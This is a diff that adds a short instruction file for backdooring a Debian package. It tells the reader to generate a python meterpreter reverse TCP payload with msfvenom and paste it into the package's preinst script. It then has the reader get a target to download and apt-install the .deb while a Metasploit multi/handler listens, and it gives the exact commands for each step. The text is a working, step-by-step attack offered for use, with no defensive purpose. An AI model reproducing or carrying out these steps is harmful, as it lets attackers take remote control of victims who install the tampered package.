@@ -1,0 +1,11 @@
+Decompress the file.
+Go to preinst script and chnage its listening interface to your IP. 
+Use following command to generate a new script -> msfvenom -p python/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444/any R
+Copy the base 64 contents of file and paste it in preinst.
+Make sure you target downloads the deb file 
+Open msfconsole or any other tool for listening.
+Commands: 1.use /exploit/multi/handler         2.set payload python/meterpreter_reverse_tcp     3.exploit
+Now apt install <deb file> on target
+You gain meterpreter session 
+
+You may use any other payload just set the ip and copy it in preinst and then set the listening mode 
